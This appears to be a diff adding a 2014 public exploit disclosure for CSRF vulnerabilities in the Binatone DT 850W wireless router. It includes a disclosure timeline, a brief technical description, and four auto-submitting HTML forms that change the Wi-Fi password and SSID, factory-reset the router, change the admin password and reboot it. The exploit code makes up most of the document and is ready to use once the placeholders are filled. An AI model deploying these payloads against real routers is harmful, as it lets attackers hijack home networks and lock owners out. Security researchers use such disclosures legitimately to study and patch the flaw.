@@ -1,0 +1,104 @@
+# Exploit Title: Binatone DT 850W Wireless Router - Multiple CSRF Vulnerabilities
+# Date: 05/20/2014
+# Author: Samandeep Singh - SaMaN( @samanL33T )
+# Vendor Homepage:http://www.binatonetelecom.in/4port-adsl2-wifi-router1.html
+# Category: Hardware/Wireless Router
+# Firmware Version: T6W-A1.005 and below
+# Tested on: Binatone DT 850W Wireless Router
+# Patch/ Fix: Vendor has not provided any fix for this yet
+---------------------------------------------------
+
+Disclosure Timeline
+~~~~~~~~~~~~~~~~~~~
+04/23/2014  Contacted Vendor 
+04/26/2014	Vendor Replied
+04/26/2014	Vulnerability Explained (No reply received)
+05/04/2014	Vendor notified about full disclosure in 15 days (No reply)
+05/20/2014	Full Disclosure
+
+Technical Details
+~~~~~~~~~~~~~~~~~~
+Binatone DT 850W Wireless Router has a Cross Site Request Forgery Vulnerability in its Web Console. Attacker can easily change Wireless password, SSId of Wireless network,Reboot Router, Reset Router,Change Router's Admin Password by simply making the user visit a CSRF link.
+
+Exploit Code 
+~~~~~~~~~~~~~
+
+Change Wifi (WPA2/PSK) password & SSID by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[TARGET/IP]/Forms/home_wlan_1"
+method="POST" name="form">
+<input type="hidden" name="wlanWEBFlag" value="0">
+<input type="hidden" name="AccessFlag" value="0">
+<input type="hidden" name="wlan_APenable" value="1">
+<input type="hidden" name="Countries_Channels" value="INDIA">
+<input type="hidden" name="Channel_ID" value="00000000">
+<input type="hidden" name="BeaconInterval" value="100">
+<input type="hidden" name="RTSThreshold" value="2347">
+<input type="hidden" name="FragmentThreshold" value="2346">
+<input type="hidden" name="DTIM" value="1">
+<input type="hidden" name="WirelessMode" value="802.11b+g+n">
+<input type="hidden" name="WLANChannelBandwidth" value="20/40 MHz">
+<input type="hidden" name="WLANGuardInterval" value="AUTO">
+<input type="hidden" name="WLANMCS" value="AUTO">
+<input type="hidden" name="wlan_MBSSIDNumber" value="2">
+<input type="hidden" name="WLSSIDIndex" value="1">
+<input type="hidden" name="ESSID_HIDE_Selection" value="0">
+<input type="hidden" name="ESSID" value="[SSID]">
+<input type="hidden" name="WEP_Selection" value="WPA2-PSK">
+<input type="hidden" name="TKIP_Selection" value="AES">
+<input type="hidden" name="PreSharedKey" value="[PASSWORD]">
+<input type="hidden" name="WPARekeyInter" value="3600">
+<input type="hidden" name="WDSMode_Selection" value="0">
+<input type="hidden" name="WLAN_FltActive" value="0">
+<input type="hidden" name="wlanRadiusWEPFlag" value="0">
+<input type="hidden" name="MBSSIDSwitchFlag" value="2">
+</form>
+</body>
+</html>
+
+Factory Reset Router Settings by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://TARGET/IP]Forms/tools_system_1"
+method="POST" name="form">
+<input type="hidden" name="restoreFlag" value="1">
+</form>
+</body>
+</html>
+
+
+Change Router's Admin Password by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[TARGET/IP]/Forms/tools_admin_1"
+method="POST" name="form">
+<input type="hidden" name="uiViewTools_Password" value="[PASSWORD]">
+<input type="hidden" name="uiViewTools_PasswordConfirm" value="[PASSWORD]">
+</form>
+</body>
+</html>
+
+
+Restart Router by CSRF
+~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://TARGET/IP]/Forms/tools_system_1"
+method="POST" name="form">
+<input type="hidden" name="restoreFlag" value="0">
+</form>
+</body>
+</html>
+
+
+--
+SaMaN
+twitter : @samanL33T <https://twitter.com/samanL33T>
